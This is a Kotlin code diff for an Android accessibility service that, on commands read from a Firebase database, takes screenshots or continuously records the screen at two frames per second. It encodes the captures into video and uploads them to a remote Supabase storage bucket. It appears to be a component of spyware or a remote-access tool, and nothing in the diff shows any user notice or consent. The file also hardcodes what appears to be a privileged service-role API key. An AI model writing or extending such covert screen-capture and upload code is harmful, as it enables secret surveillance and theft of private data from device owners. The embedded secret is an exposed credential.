@@ -14,6 +14,8 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.util.concurrent.Executor
+import kotlin.coroutines.resume
+import kotlin.coroutines.suspendCoroutine
 
 class ScreenshotService : AccessibilityService() {
 
@@ -23,9 +25,9 @@ class ScreenshotService : AccessibilityService() {
         const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
         const val BUCKET_SS    = "screenshots"
         const val BUCKET_VID   = "videos"
-        const val FPS          = 2           // 2 screenshots/sec
-        const val CHUNK_SEC    = 30          // 30 sec per video
-        const val FRAMES_PER_CHUNK = FPS * CHUNK_SEC  // 60 frames
+        const val FPS          = 2
+        const val CHUNK_SEC    = 30
+        const val FRAMES_PER_CHUNK = FPS * CHUNK_SEC
     }
 
     private val deviceId by lazy {
@@ -42,14 +44,15 @@ class ScreenshotService : AccessibilityService() {
         .build()
 
     private var liveCapJob: Job? = null
-    private var isLiveEnabled = false
+    private var isLiveEnabled    = false
+    private val serviceScope     = CoroutineScope(Dispatchers.Main + SupervisorJob())
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         serviceInfo = AccessibilityServiceInfo().apply {
-            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
+            eventTypes  = AccessibilityEvent.TYPES_ALL_MASK
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
+            flags        = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
         }
         regRef.child("accessibility_granted").setValue(true)
         listenForCommands()
@@ -61,14 +64,14 @@ class ScreenshotService : AccessibilityService() {
             override fun onDataChange(s: DataSnapshot) {
                 if (s.exists() && s.getValue(Boolean::class.java) == true) {
                     database.child("take_screenshot").removeValue()
-                    reportStatus("⏳ Taking screenshot...")
+                    reportStatus("📸 Taking screenshot...")
                     captureOne { bmp -> uploadScreenshot(bmp) }
                 }
             }
             override fun onCancelled(e: DatabaseError) {}
         })
 
-        // Live capture toggle (2/sec → 30s video)
+        // Live capture toggle
         database.child("live_capture_enabled").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(s: DataSnapshot) {
                 val enabled = s.getValue(Boolean::class.java) ?: false
@@ -96,13 +99,14 @@ class ScreenshotService : AccessibilityService() {
         })
     }
 
-    // ── SINGLE SCREENSHOT ─────────────────────────────────────────────────────
+    // ─── Single screenshot (callback-based) ───────────────────────────────────
 
     private fun captureOne(onResult: (Bitmap) -> Unit) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             reportStatus("❌ Requires Android 11+"); return
         }
-        val executor = Executor { it.run() }
+        val executor = Executor { cmd -> cmd.run() }
+        @Suppress("NewApi")
         takeScreenshot(android.view.Display.DEFAULT_DISPLAY, executor,
             object : TakeScreenshotCallback {
                 override fun onSuccess(r: ScreenshotResult) {
@@ -116,26 +120,46 @@ class ScreenshotService : AccessibilityService() {
             })
     }
 
-    // ── LIVE CAPTURE ──────────────────────────────────────────────────────────
+    // ─── Suspend version for use inside coroutine ─────────────────────────────
+
+    @Suppress("NewApi")
+    private suspend fun captureOneSuspend(): Bitmap? = suspendCoroutine { cont ->
+        val executor = Executor { cmd -> cmd.run() }
+        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, executor,
+            object : TakeScreenshotCallback {
+                override fun onSuccess(r: ScreenshotResult) {
+                    val bmp = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
+                        ?.copy(Bitmap.Config.ARGB_8888, false)
+                    r.hardwareBuffer.close()
+                    cont.resume(bmp)
+                }
+                override fun onFailure(code: Int) { cont.resume(null) }
+            })
+    }
+
+    // ─── Live capture: 2fps → 30s chunks → video upload ──────────────────────
 
     private fun startLiveCapture() {
-        liveCapJob = CoroutineScope(Dispatchers.Main).launch {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            reportStatus("❌ Live capture requires Android 11+")
+            isLiveEnabled = false
+            return
+        }
+        liveCapJob = serviceScope.launch {
             while (isActive && isLiveEnabled) {
                 val frames = mutableListOf<Bitmap>()
-                reportStatus("🔴 Live capture: collecting frames...")
+                reportStatus("🔴 Live capture ON — collecting...")
 
-                // Collect FRAMES_PER_CHUNK frames at 2/sec
                 repeat(FRAMES_PER_CHUNK) {
                     if (!isActive || !isLiveEnabled) return@repeat
-                    captureOne { bmp -> frames.add(bmp) }
+                    val bmp = withTimeoutOrNull(3_000L) { captureOneSuspend() }
+                    if (bmp != null) frames.add(bmp)
                     delay(1000L / FPS)
                 }
 
                 if (frames.size >= 10) {
-                    reportStatus("🎬 Encoding ${frames.size} frames to video...")
-                    withContext(Dispatchers.IO) {
-                        encodeAndUpload(frames)
-                    }
+                    reportStatus("🎬 Encoding ${frames.size} frames...")
+                    withContext(Dispatchers.IO) { encodeAndUpload(ArrayList(frames)) }
                     frames.forEach { it.recycle() }
                 } else {
                     frames.forEach { it.recycle() }
@@ -146,21 +170,19 @@ class ScreenshotService : AccessibilityService() {
 
     private fun encodeAndUpload(frames: List<Bitmap>) {
         try {
-            val outFile = File(cacheDir, "live_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.mp4")
+            val outFile = File(cacheDir,
+                "vid_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.mp4")
             val ok = VideoEncoderHelper.encode(frames, FPS, outFile)
-            if (ok && outFile.length() > 0) {
-                uploadVideo(outFile)
-            } else {
-                reportStatus("❌ Video encoding failed")
-            }
+            if (ok) uploadVideo(outFile)
+            else { reportStatus("❌ Encoding failed"); outFile.delete() }
         } catch (e: Exception) {
-            reportStatus("❌ Encode error: ${e.message?.take(80)}")
+            reportStatus("❌ Encode: ${e.message?.take(60)}")
         }
     }
 
     private fun uploadVideo(file: File) {
         try {
-            val fileName = "live_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.mp4"
+            val fileName = "vid_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.mp4"
             val body = file.readBytes().toRequestBody("video/mp4".toMediaType())
             val req = Request.Builder()
                 .url("$SUPABASE_URL/storage/v1/object/$BUCKET_VID/$fileName")
@@ -168,8 +190,7 @@ class ScreenshotService : AccessibilityService() {
                 .header("apikey", SUPABASE_KEY)
                 .header("Content-Type", "video/mp4")
                 .header("x-upsert", "true")
-                .post(body)
-                .build()
+                .post(body).build()
             http.newCall(req).execute().use { resp ->
                 if (resp.isSuccessful) {
                     val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_VID/$fileName"
@@ -179,21 +200,19 @@ class ScreenshotService : AccessibilityService() {
                             "deviceId"  to deviceId,
                             "url"       to url,
                             "timestamp" to System.currentTimeMillis(),
-                            "fileName"  to fileName
+                            "fileName"  to fileName,
+                            "type"      to "video"
                         ))
                     reportStatus("🎬 Video uploaded ✅ (${file.length() / 1024}KB)")
                 } else {
-                    val err = resp.body?.string()?.take(100) ?: ""
-                    reportStatus("❌ Video upload failed ${resp.code}: $err")
+                    reportStatus("❌ Video upload ${resp.code}: ${resp.body?.string()?.take(80)}")
                 }
             }
             file.delete()
         } catch (e: Exception) {
-            reportStatus("❌ Video upload error: ${e.message?.take(80)}")
+            reportStatus("❌ Video upload: ${e.message?.take(60)}")
         }
     }
-
-    // ── SINGLE SCREENSHOT UPLOAD ───────────────────────────────────────────────
 
     private fun uploadScreenshot(bitmap: Bitmap) {
         CoroutineScope(Dispatchers.IO).launch {
@@ -210,8 +229,7 @@ class ScreenshotService : AccessibilityService() {
                     .header("apikey", SUPABASE_KEY)
                     .header("Content-Type", "image/jpeg")
                     .header("x-upsert", "true")
-                    .post(body)
-                    .build()
+                    .post(body).build()
                 http.newCall(req).execute().use { resp ->
                     if (resp.isSuccessful) {
                         val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_SS/$fileName"
@@ -220,12 +238,11 @@ class ScreenshotService : AccessibilityService() {
                             .setValue(mapOf("deviceId" to deviceId, "url" to url, "timestamp" to ts))
                         reportStatus("📸 Screenshot uploaded ✅")
                     } else {
-                        val err = resp.body?.string()?.take(120) ?: ""
-                        reportStatus("❌ Upload ${resp.code}: $err")
+                        reportStatus("❌ SS upload ${resp.code}: ${resp.body?.string()?.take(80)}")
                     }
                 }
             } catch (e: Exception) {
-                reportStatus("❌ Upload error: ${e.message?.take(80)}")
+                reportStatus("❌ SS upload: ${e.message?.take(60)}")
             }
         }
     }
@@ -241,6 +258,7 @@ class ScreenshotService : AccessibilityService() {
         super.onDestroy()
         isLiveEnabled = false
         liveCapJob?.cancel()
+        serviceScope.cancel()
         regRef.child("accessibility_granted").setValue(false)
     }
 }
